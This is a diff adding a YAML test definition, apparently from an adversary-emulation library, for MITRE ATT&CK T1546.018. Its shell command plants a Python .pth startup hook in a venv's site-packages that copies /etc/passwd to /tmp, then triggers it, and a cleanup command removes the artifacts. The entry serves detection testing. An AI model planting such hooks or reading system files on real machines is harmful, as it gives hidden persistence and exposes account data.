@@ -1,0 +1,28 @@
+---
+- id: 85b65557f13a6fe02e9fa2b1531d2fe3
+  name: Python Startup Hook - atomic_hook.pth (Linux)
+  description: "Executes code by creating atomic_hook.pth in the site-packages directory.\
+    \ \nThis script runs automatically for every user on the system when Python starts.\n"
+  tactic: multiple
+  technique:
+    attack_id: T1546.018
+    name: 'Event Triggered Execution: Python Startup Hooks'
+  platforms:
+    linux:
+      sh:
+        command: 'TEMPDIR="/tmp/atomic_sitecust_posix"; mkdir -p "$TEMPDIR"; "python3"
+          -m venv "$TEMPDIR/env"; SITE_PACKAGES=$("$TEMPDIR/env/bin/python3" -c "import
+          site; print(site.getsitepackages()[0])"); echo "import os; os.system(''cat
+          /etc/passwd 1> /tmp/atomic_hook_poc.txt'')" > "$SITE_PACKAGES/atomic_hook.pth";
+          ls -la "$SITE_PACKAGES/atomic_hook.pth"; "$TEMPDIR/env/bin/python" -c "print(''Triggering
+          Hook via atomic_hook...'')"; if [ -f /tmp/atomic_hook_poc.txt ]; then echo
+          "[+] Success: atomic_hook_poc.txt created under /tmp \n" $(ls -la /tmp/
+          | grep -w atomic_hook_poc.txt); else echo "Failed: /tmp/atomic_hook_poc.txt
+          not found"; fi'
+        payloads: []
+        cleanup: "if [ ! -f /tmp/atomic_hook_poc.txt ] || [ ! -d /tmp/atomic_sitecust_posix\
+          \ ]; then echo \"[!] Missing artifact or folder: /tmp/atomic_hook_poc.txt\
+          \ or /tmp/atomic_sitecust_posix \u2014 [-] Please Run : Invoke-AtomicTest\
+          \ T1546.018\"; exit 0; fi; rm -rf /tmp/atomic_sitecust_posix; echo \"[+]\
+          \ Successful Removed atomic_hook.pth\"; rm -rf /tmp/atomic_hook_poc.txt;\
+          \ echo \"[+] Successful Removed atomic_hook_poc.txt under /tmp\""
